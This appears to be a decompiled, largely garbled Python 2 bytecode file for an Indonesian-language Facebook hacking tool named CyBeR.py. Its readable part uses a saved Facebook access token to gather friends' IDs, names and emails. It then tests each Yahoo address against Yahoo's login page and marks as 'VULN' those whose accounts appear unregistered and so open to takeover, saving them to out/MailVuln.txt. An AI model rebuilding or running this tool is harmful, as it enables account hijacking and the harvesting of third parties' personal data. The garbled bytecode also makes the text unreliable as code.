t   __main__s   [1;91mIsi yang benarc          C   s�  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d	 } d
 d GHt d � t
 j d
 t � } t j | j � } t d � d GHd
 d GHx�| d D]�} | d 7} |  j | � | d } | d } t
 j d | d t � } t j | j � } y9| d }	 t j d � }
 |
 j |	 � j �  } d | k r�t j d � t t j _ t j d d	 � |	 t d <t j �  j �  } t j d � }
 y |
 j | � j �  } Wn
 w� n Xd | k r�d GHd | GHd |	 GHd  | d! GHt d" d# � } | j d$ t d% | d& |	 d' � | j �  t  j |	 � q�n  Wq� t! k
 r�q� Xq� Wd
 d GHd( GHd) t" t# t  � � GHd* GHt$ d+ � t% �  d  S(,   NR�   s	   login.txtR`   s   [1;91m[!] Token Invalids   rm -rf login.txti   R�   R   i    i*   s   [1;96m=s<   [1;96m[[1;97m✺[1;96m] [1;93mMengambil email [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s2   [1;96m[[1;97m✺[1;96m] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zR�   Ro   Rn   s   https://graph.facebook.com/s   ?access_token=R�   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR�   R�   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   [1;96m[✓] [1;92mVULNs)   [1;96m[➹] [1;97mID   [1;91m: [1;92ms)   [1;96m[➹] [1;97mEmail[1;91m: [1;92ms)   [1;96m[➹] [1;97mNama [1;91m: [1;92ms   
s   out/MailVuln.txtRA   s   Name : s
   
ID        : s
   
Email  : s   

s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msA   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/MailVuln.txts   
[1;96m[[1;97mKembali[1;96m](&   R   R-   RE   RF   R\   Re   R   R   R   R�   R�   R0   R(   RO   RJ   RV   RW   RX   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R   Rn   RY   R�   R[   R$   R   R9   Rg   (   R�   R�   R�   R�   R   Ro   Rt   R�   R&   R�   R�   R]   R�   R�   R�   R�   (    (    s   CyBeR.pyR�   �  s|    





	

	






		
%

	
c           C   sI   t  j d � t GHd GHt d � t  j d � t d � t  j d � d  S(   NR   s�   [1;94m──────────────────────────────────────────────────s$   [1;92mMemperbarui Script ...[1;93ms   git pull origin masters!   
[1;94m{[1;97m<Kembali>[1;94m}s   python2 CyBeR.py(   R   R-   R0   R(   R9   (    (    (    s   CyBeR.pyR�   2  s    



(_   R   R
   R   t	   mechanizeR   R   R   t   hashlibR�   t	   threadingRV   t   getpassR�   t	   cookielibt   multiprocessing.poolR    t   Pt   Mt   Ht   Kt   Bt   Ut   Ot   my_colort   choiceRr   Rq   t   ImportErrorR-   RO   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR�   t   set_handle_robotsRM   t   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   t   Threadt   tt   startR   R�   R   R!   R   R(   R0   t   CorrectUsernamet   CorrectPasswordt   loopR9   R�   t   passwordR/   t   backt   threadsR�   R�   R�   R�   Ro   R2   R1   R>   R:   R;   R_   RZ   Rg   Rs   R}   R�   R�   R�   R�   R�   R�   R�   R�   R�   R~   R   R�   R�   R�   R�   R�   t   __name__(    (    (    s   CyBeR.pyt   <module>   s�   �






	

			
	,	
			
				
			)		
			� 		� 		�		� 	�	�	
			B		
	B		